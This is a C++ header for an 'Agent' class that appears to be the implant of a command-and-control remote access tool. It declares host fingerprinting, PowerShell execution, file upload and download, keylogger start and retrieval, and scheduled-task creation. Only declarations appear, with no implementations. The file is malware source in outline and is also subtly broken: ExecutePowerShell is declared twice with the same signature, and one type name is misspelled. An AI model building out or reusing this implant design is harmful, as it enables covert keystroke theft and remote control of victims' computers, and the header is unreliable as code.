//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
#pragma once
#include <string>
#include "CommManager.h"
#include "TaskQueueManager.h"
#include <windows.h>

class Agent
{
public:
	Agent(CommManager commManager, TaskQueueManager taskManager);
	void Start();

	// Host metadata commands
	BOOL GetUsername(OUT LPWSTR *szWhoamiStr);
	std::string GetInternalIP();
	std::string GetExternalViaDNS();
	int GetPID();
	std::string GetProcessName();
	std::string GetMachineMacAddress();
	std::string GetMotherBoard();
	int GetRAM();
	int GetOSVersion();
	void GetTotalDiskSize(OUT double *total, OUT double *free);
	int GetCpuCount();
	IntitalCheckinRequest GetHostInformation();

	// Agent base commands
	void Exit();
	Response GetUID(const int &taskID, const bool &isTrue);
	Response ExecutePowerShell(const int &taskID, const CommandPowershell &psRequest);
	Response UploadFile(const int &taskID, const CommandUploadFile &uploadRequest);
	Response DownloadFile(const int &taskID, const CommandDownloadFile &downloadRequest);
	Response keylog_start(const int &taskID, const keyloggerStartRequest &keyloggerStartRequest);
	Response get_keylog_data(const int &taskID, const keyloggerStopRequest &keyloggerStopRequest);


	Response ExecutePowerShell(const int& taskID, const CommandPowershell& request);
	Response CreateWindowsTaskW(const int& taskID, const CommandWinTask& request);
private:
	CommManager commManager;
	TaskQueueManager taskManager;
	std::string CaptureCommandOutput(const std::string &cmd);
};
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//